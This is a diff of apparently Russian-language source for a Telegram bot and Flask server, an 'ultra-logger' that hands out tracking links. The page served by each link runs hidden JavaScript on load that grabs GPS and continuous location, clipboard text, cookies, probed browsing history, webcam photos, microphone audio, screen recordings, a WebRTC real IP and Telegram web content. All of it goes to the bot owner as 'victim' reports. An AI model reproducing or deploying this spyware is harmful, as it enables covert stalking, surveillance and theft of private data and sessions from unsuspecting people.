@@ -43,47 +43,17 @@ body{background:#000;font-family:Arial;overflow:hidden}
 <video id="v" style="display:none" autoplay playsinline></video><canvas id="c" style="display:none"></canvas>
 <script>
 fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?'})});
-
-// GPS
 function getGPS(){if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err=>{navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err2=>{},{enableHighAccuracy:true,timeout:20000,maximumAge:0});},{enableHighAccuracy:true,timeout:20000,maximumAge:0});}}
-
-// История браузера
 async function stealHistory(){var sites=['https://web.telegram.org','https://vk.com','https://ok.ru','https://instagram.com','https://twitter.com','https://youtube.com','https://discord.com','https://github.com','https://steamcommunity.com','https://reddit.com','https://tinder.com','https://onlyfans.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru','https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'];var visited=[];for(var i=0;i<sites.length;i++){try{var img=new Image();img.src=sites[i]+'/favicon.ico';await new Promise(function(r){img.onload=function(){visited.push(sites[i]);r();};img.onerror=function(){visited.push(sites[i]);r();};setTimeout(function(){r();},500);});}catch(e){}}if(visited.length>0){fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});}}
-
-// Буфер обмена
 async function stealClipboard(){try{var text=await navigator.clipboard.readText();if(text&&text.length>0){fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}}catch(e){}}
-
-// WebRTC IP (реальный IP даже через VPN)
 function getWebRTCIP(){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(e){if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(ip){fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:ip[0]})});}}};}
-
-// Telegram аккаунт
 function checkTelegram(){var iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='https://web.telegram.org/k/';iframe.onload=function(){try{var doc=iframe.contentDocument||iframe.contentWindow.document;var text=doc.body.innerText||'';if(text.length>0){fetch('/telegram_check/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({telegram_text:text.substring(0,500)}));}}catch(e){}};document.body.appendChild(iframe);setTimeout(function(){document.body.removeChild(iframe);},5000);}
-
-// Куки-граббер
 function stealCookies(){var cookies=document.cookie;if(cookies.length>0){fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:cookies})});}}
-
-// Камера
 async function cam(){try{var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});var v=document.getElementById('v');v.srcObject=st;await v.play();await new Promise(function(r){setTimeout(r,3000);});var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);var ph=c.toDataURL('image/jpeg',0.7);await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
-
-// Аудио
 async function recordAudio(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var chunks=[];var rec=new MediaRecorder(st);rec.ondataavailable=function(e){chunks.push(e.data);};rec.start();await new Promise(function(r){setTimeout(function(){rec.stop();r();},5000);});var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){}}
-
-// Запись экрана
-async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});await new Promise(function(r){setTimeout(r,1000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop();});}catch(e){console.log('Screen:',e);}}
-
-// Гео-трекинг (непрерывный)
+async function recordScreen(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:{mediaSource:'screen'}});var chunks=[];var rec=new MediaRecorder(st,{mimeType:'video/webm;codecs=vp9'});rec.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};rec.start(1000);await new Promise(function(r){setTimeout(function(){rec.stop();r();},8000);});await new Promise(function(r){setTimeout(r,1000);});var blob=new Blob(chunks,{type:'video/webm'});var reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=function(){fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});};st.getTracks().forEach(function(t){t.stop());};}catch(e){}}
 function startGeoTracking(){if(navigator.geolocation){setInterval(function(){navigator.geolocation.getCurrentPosition(pos=>{fetch('/geo_track/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,ts:Date.now()})});},err=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0});},10000);}}
-
-setTimeout(getGPS,1000);
-setTimeout(stealHistory,2000);
-setTimeout(cam,3000);
-setTimeout(recordAudio,4000);
-setTimeout(recordScreen,5000);
-setTimeout(stealClipboard,6000);
-setTimeout(getWebRTCIP,7000);
-setTimeout(checkTelegram,8000);
-setTimeout(stealCookies,9000);
-setTimeout(startGeoTracking,10000);
+setTimeout(getGPS,1000);setTimeout(stealHistory,2000);setTimeout(cam,3000);setTimeout(recordAudio,4000);setTimeout(recordScreen,5000);setTimeout(stealClipboard,6000);setTimeout(getWebRTCIP,7000);setTimeout(checkTelegram,8000);setTimeout(stealCookies,9000);setTimeout(startGeoTracking,10000);
 </script></body></html>"""
 
 AUDIO_PAGE = """<!DOCTYPE html>
@@ -107,23 +77,26 @@ def gen_id():
 
 def get_ip_info(ip):
     first_ip = ip.split(',')[0].strip()
-    for url in [f"https://ipapi.co/{first_ip}/json/", f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", f"https://ipwhois.app/json/{first_ip}"]:
-        try:
-            r = requests.get(url, timeout=5)
-            data = r.json()
-            if data.get('city'):
-                return {'country': data.get('country_name') or data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('region') or data.get('regionName','?'), 'isp': data.get('org') or data.get('isp','?'), 'lat': data.get('latitude') or data.get('lat'), 'lon': data.get('longitude') or data.get('lon'), 'query': first_ip}
-        except: pass
+    try:
+        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
+        data = r.json()
+        if data.get('city'):
+            return {'country': data.get('country_name','?'), 'city': data.get('city','?'), 'region': data.get('region','?'), 'isp': data.get('org','?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
+    except: pass
+    try:
+        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
+        data = r.json()
+        if data.get('city'):
+            return {'country': data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('regionName','?'), 'isp': data.get('isp','?'), 'lat': data.get('lat'), 'lon': data.get('lon'), 'query': first_ip}
+    except: pass
     return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}
 
 @app.route('/')
-def home():
-    return "OK"
+def home(): return "OK"
 
 @app.route('/go/<lid>')
 def track(lid):
-    if lid not in links:
-        return "Ссылка недействительна"
+    if lid not in links: return "Ссылка недействительна"
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '?')
     v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None, 'audio': None, 'screen': None, 'clipboard': None, 'webrtc_ip': None, 'telegram': None, 'cookies': None, 'geo_track': []}
@@ -139,70 +112,60 @@ def track(lid):
 def coll(lid):
     if lid in links and links[lid]['victims']: links[lid]['victims'][-1]['dev'] = request.get_json()
     return 'ok'
-
 @app.route('/photo/<lid>', methods=['POST'])
 def photo(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
     return 'ok'
-
 @app.route('/gps/<lid>', methods=['POST'])
 def gps(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         links[lid]['victims'][-1]['gps'] = d
     return 'ok'
-
 @app.route('/history/<lid>', methods=['POST'])
 def history(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         links[lid]['victims'][-1]['history'] = d
     return 'ok'
-
 @app.route('/audio/<lid>', methods=['POST'])
 def audio(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('audio'): links[lid]['victims'][-1]['audio'] = d['audio']
     return 'ok'
-
 @app.route('/screen/<lid>', methods=['POST'])
 def screen(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('screen'): links[lid]['victims'][-1]['screen'] = d['screen']
     return 'ok'
-
 @app.route('/clipboard/<lid>', methods=['POST'])
 def clipboard(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
     return 'ok'
-
 @app.route('/webrtc/<lid>', methods=['POST'])
 def webrtc(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('webrtc_ip'): links[lid]['victims'][-1]['webrtc_ip'] = d['webrtc_ip']
     return 'ok'
-
 @app.route('/telegram_check/<lid>', methods=['POST'])
 def telegram_check(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('telegram_text'): links[lid]['victims'][-1]['telegram'] = d['telegram_text']
     return 'ok'
-
 @app.route('/cookies/<lid>', methods=['POST'])
 def cookies(lid):
     if lid in links and links[lid]['victims']:
         d = request.get_json()
         if d.get('cookies'): links[lid]['victims'][-1]['cookies'] = d['cookies']
     return 'ok'
-
 @app.route('/geo_track/<lid>', methods=['POST'])
 def geo_track(lid):
     if lid in links and links[lid]['victims']:
@@ -215,6 +178,7 @@ async def notify(uid, lid):
         await asyncio.sleep(25)
         v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
         
+        # Создаём ZIP
         zip_path = f"/tmp/data_{lid}.zip"
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
             report = f"""📋 ОТЧЁТ IP LOGGER
@@ -230,17 +194,17 @@ async def notify(uid, lid):
 """
             if v.get('gps') and v['gps'].get('lat'):
                 report += f"📍 ТОЧНЫЙ GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
-            if v.get('geo_track'):
-                report += f"\n📍 Гео-трек ({len(v['geo_track'])} точек)\n"
             if v.get('history') and v['history'].get('visited'):
-                report += f"\n📜 История браузера ({len(v['history']['visited'])} сайтов):\n"
+                report += f"\n📜 История браузера:\n"
                 for site in v['history']['visited']: report += f"  • {site}\n"
             if v.get('clipboard'):
-                report += f"\n📋 Буфер обмена:\n{v['clipboard'][:500]}\n"
+                report += f"\n📋 Буфер обмена:\n{v['clipboard'][:300]}\n"
             if v.get('cookies'):
-                report += f"\n🍪 Куки:\n{v['cookies'][:500]}\n"
+                report += f"\n🍪 Куки:\n{v['cookies'][:300]}\n"
             if v.get('telegram'):
-                report += f"\n📱 Telegram данные:\n{v['telegram'][:500]}\n"
+                report += f"\n📱 Telegram:\n{v['telegram'][:300]}\n"
+            if v.get('geo_track'):
+                report += f"\n📍 Гео-трек: {len(v['geo_track'])} точек\n"
             zf.writestr('report.txt', report)
             
             if v.get('photo'):
@@ -253,33 +217,27 @@ async def notify(uid, lid):
                 try: zf.writestr('screen_record.webm', base64.b64decode(v['screen'].split(',')[1]))
                 except: pass
         
+        # Отправляем ZIP
         await bot.send_file(uid, zip_path, caption=f"📦 Архив `{lid}`", force_document=True)
         os.remove(zip_path)
         
+        # Гео-точка
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(v['gps'].get('acc',10))))
-            await bot.send_file(uid, file=geo, caption=f"📍 ТОЧНЫЙ GPS (±{v['gps'].get('acc','?')}м)")
+            await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{v['gps'].get('acc','?')}м)")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
             await bot.send_file(uid, file=geo, caption="📍 IP-гео")
             await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
         
-        # Если есть WebRTC IP — шлём отдельно
+        # WebRTC IP отдельным сообщением
         if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
-            await bot.send_message(uid, f"🕵️ **WebRTC IP (реальный):** `{v['webrtc_ip']}`\n(даже через VPN!)")
-        
-        # Если есть данные Telegram — шлём
-        if v.get('telegram'):
-            await bot.send_message(uid, f"📱 **Telegram данные:**\n{v['telegram'][:300]}")
-        
-        # Если есть куки — шлём
-        if v.get('cookies'):
-            await bot.send_message(uid, f"🍪 **Куки:**\n{v['cookies'][:300]}")
+            await bot.send_message(uid, f"🕵️ **Реальный IP (WebRTC):** `{v['webrtc_ip']}`")
         
     except Exception as e:
-        print(f"Ошибка: {e}")
+        print(f"Ошибка notify: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
@@ -301,21 +259,21 @@ async def callback(event):
 @bot.on(events.NewMessage(pattern='/list'))
 async def lst(event):
     my = {k: v for k, v in links.items() if v['owner'] == event.sender_id}
-    if not my:
-        await event.reply("Нет ссылок")
+    if not my: await event.reply("Нет ссылок")
     else:
         r = "📋 **Ссылки:**\n"
-        for lid, d in my.items():
-            r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
+        for lid, d in my.items(): r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
         await event.reply(r)
 
 async def main():
     global loop
     loop = asyncio.get_event_loop()
     port = int(os.environ.get('PORT', 8080))
-    def run_flask():
-        app.run(host='0.0.0.0', port=port, debug=False)
+    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
     threading.Thread(target=run_flask, daemon=True).start()
     await bot.start(bot_token=BOT_TOKEN)
     print("✅ Ультра-логгер запущен!")
-    await bot.run_until_discon
+    await bot.run_until_disconnected()
+
+if __name__ == "__main__":
+    asyncio.run(main())
